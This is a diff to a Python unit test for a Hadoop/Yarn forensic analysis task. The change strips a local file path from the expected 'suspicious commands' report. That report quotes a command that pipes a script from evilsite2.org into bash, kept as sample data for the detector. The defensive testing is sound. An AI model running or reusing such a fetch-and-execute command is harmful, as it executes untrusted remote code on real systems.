@@ -27,11 +27,11 @@ class HadoopAnalysisTest(unittest.TestCase):
   """Tests for HadoopAnalysisTask."""
 
   _EXPECTED_REPORT = """Found suspicious commands!
-	File: /usr/local/google/home/romaing/src/turbinia/turbinia/workers/../../test_data/bad_yarn_saved_task
+	File: /../../test_data/bad_yarn_saved_task
 Command: "1533561022643*Bcurl https://evilsite2.org/aldnalezi/mygit/raw/master/ab.sh | bash0"
 
 All strings from Yarn Tasks:
-Strings for /usr/local/google/home/romaing/src/turbinia/turbinia/workers/../../test_data/bad_yarn_saved_task:
+Strings for /../../test_data/bad_yarn_saved_task:
 hadoop
 default"
 EHDTS
@@ -50,9 +50,9 @@ Failing this attempt.Diagnostics: For more detailed output, check the applicatio
 """
 
   def setUp(self):
-    filedir = os.path.dirname(os.path.realpath(__file__))
+    self.filedir = os.path.dirname(os.path.realpath(__file__))
     self.test_file = os.path.join(
-        filedir, '..', '..', 'test_data', 'bad_yarn_saved_task')
+        self.filedir, '..', '..', 'test_data', 'bad_yarn_saved_task')
 
   def testAnalyzeHadoopAppRoot(self):
     """Tests the _AnalyzeHadoopAppRoot method."""
@@ -60,4 +60,4 @@ Failing this attempt.Diagnostics: For more detailed output, check the applicatio
     task = hadoop.HadoopAnalysisTask()
     self.maxDiff = None
     report = task._AnalyzeHadoopAppRoot([self.test_file])
-    self.assertEqual(report, self._EXPECTED_REPORT)
+    self.assertEqual(report.replace(self.filedir, ''), self._EXPECTED_REPORT)
